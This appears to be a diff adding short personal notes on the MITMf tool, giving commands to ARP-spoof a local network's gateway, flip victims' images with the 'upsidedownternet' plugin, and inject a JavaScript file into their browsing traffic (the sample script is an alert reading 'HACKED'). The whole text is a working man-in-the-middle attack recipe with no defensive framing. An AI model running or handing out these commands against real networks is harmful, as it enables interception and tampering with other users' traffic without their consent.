@@ -1,0 +1,8 @@
+sudo apt-get update && sudo apt-get upgrade
+sudo apt-get install mitmf
+netstat -rn and get the gateway
+sudo mitmf -i interface --spoof --arp --gateway IP --upsidedownternet
+
+WE CAN INJECT JS:
+	create a js file with an alert for ex: alert("HACKED"); > script.js
+	sudo mitmf -i interface --spoof --arp --gateway IP --inject --js-file script.js
